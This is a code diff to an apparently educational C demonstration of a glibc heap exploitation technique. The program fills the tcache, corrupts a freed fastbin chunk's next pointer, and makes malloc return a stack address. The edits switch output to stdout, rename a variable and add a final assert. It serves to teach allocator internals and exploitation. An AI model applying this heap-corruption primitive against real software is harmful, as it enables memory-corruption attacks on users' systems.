@@ -1,12 +1,14 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <assert.h>
 
 const size_t allocsize = 0x40;
 
 int main(){
-  fprintf(
-    stderr,
+  setbuf(stdout, NULL);
+
+  printf(
     "\n"
     "This attack is intended to have a similar effect to the unsorted_bin_attack,\n"
     "except it works with a small allocation size (allocsize <= 0x78).\n"
@@ -21,8 +23,7 @@ int main(){
     ptrs[i] = malloc(allocsize);
   }
 
-  fprintf(
-    stderr,
+  printf(
     "First we need to free(allocsize) at least 7 times to fill the tcache.\n"
     "(More than 7 times works fine too.)\n\n"
   );
@@ -32,18 +33,16 @@ int main(){
     free(ptrs[i]);
   }
 
-  char* p = ptrs[7];
-  fprintf(
-    stderr,
+  char* victim = ptrs[7];
+  printf(
     "The next pointer that we free is the chunk that we're going to corrupt: %p\n"
     "It doesn't matter if we corrupt it now or later. Because the tcache is\n"
     "already full, it will go in the fastbin.\n\n",
-    p
+    victim
   );
-  free(p);
+  free(victim);
 
-  fprintf(
-    stderr,
+  printf(
     "Next we need to free between 1 and 6 more pointers. These will also go\n"
     "in the fastbin. If the stack address that we want to overwrite is not zero\n"
     "then we need to free exactly 6 more pointers, otherwise the attack will\n"
@@ -60,30 +59,27 @@ int main(){
   size_t stack_var[6];
   memset(stack_var, 0xcd, sizeof(stack_var));
 
-  fprintf(
-    stderr,
+  printf(
     "The stack address that we intend to target: %p\n"
     "It's current value is %p\n",
     &stack_var[2],
     (char*)stack_var[2]
   );
 
-  fprintf(
-    stderr,
+  printf(
     "Now we use a vulnerability such as a buffer overflow or a use-after-free\n"
     "to overwrite the next pointer at address %p\n\n",
-    p
+    victim
   );
 
   //------------VULNERABILITY-----------
 
-  // Overwrite linked list pointer in p.
-  *(size_t**)p = &stack_var[0];
+  // Overwrite linked list pointer in victim.
+  *(size_t**)victim = &stack_var[0];
 
   //------------------------------------
 
-  fprintf(
-    stderr,
+  printf(
     "The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n"
   );
 
@@ -92,18 +88,16 @@ int main(){
     ptrs[i] = malloc(allocsize);
   }
 
-  fprintf(
-    stderr,
+  printf(
     "Let's just print the contents of our array on the stack now,\n"
     "to show that it hasn't been modified yet.\n\n"
   );
 
   for (i = 0; i < 6; i++) {
-    fprintf(stderr, "%p: %p\n", &stack_var[i], (char*)stack_var[i]);
+    printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
   }
 
-  fprintf(
-    stderr,
+  printf(
     "\n"
     "The next allocation triggers the stack to be overwritten. The tcache\n"
     "is empty, but the fastbin isn't, so the next allocation comes from the\n"
@@ -124,16 +118,17 @@ int main(){
   malloc(allocsize);
 
   for (i = 0; i < 6; i++) {
-    fprintf(stderr, "%p: %p\n", &stack_var[i], (char*)stack_var[i]);
+    printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
   }
 
   char *q = malloc(allocsize);
-  fprintf(
-    stderr,
+  printf(
     "\n"
     "Finally, if we malloc one more time then we get the stack address back: %p\n",
     q
   );
+
+  assert(q == (char *)&stack_var[2]);
 
   return 0;
 }
